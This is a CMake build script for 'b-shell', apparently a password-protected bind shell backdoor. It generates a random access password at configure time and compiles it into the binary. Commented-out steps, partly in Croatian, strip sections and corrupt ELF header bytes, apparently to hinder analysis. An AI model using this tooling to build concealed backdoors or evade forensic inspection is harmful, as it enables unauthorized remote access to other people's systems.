project(b-shell)
cmake_minimum_required(VERSION 3.0)
# This will create a 32 byte "password" for the bind shell. This command
# is only run when "cmake" is run, so if you want to generate a new password
# then "cmake ..; make" should be run from the command line.
exec_program("/bin/sh"
        ${CMAKE_CURRENT_SOURCE_DIR}
        ARGS "-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 64'"
        OUTPUT_VARIABLE p)
# Pass the random password into ${PROJECT_NAME} as a macro
add_definitions(-Dp="${p}")

#set(CMAKE_C_COMPILER musl-gcc)
#set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -s -fvisibility=hidden -static -std=gnu11")
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -g -std=gnu11")
add_executable(${PROJECT_NAME} code.c xor_string.h)

# After the build is successful, display the random password to the user
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
        COMMAND ${CMAKE_COMMAND} -E echo
        "The bind shell password is:" ${p})

# Izbriši section .comment
#add_custom_command(TARGET ${PROJECT_NAME}
#        POST_BUILD
#        COMMAND strip -R .comment ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})
#makni tablicu section headera
#add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
#        COMMAND ${PROJECT_SOURCE_DIR}/stripBinary/stripBinary ${PROJECT_BINARY_DIR}/${PROJECT_NAME})
#flip endianess byte
#add_custom_command(TARGET ${PROJECT_NAME}
#        POST_BUILD
#        COMMAND echo 'Ag==' | base64 -d | dd conv=notrunc of=${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME} bs=1 seek=5)
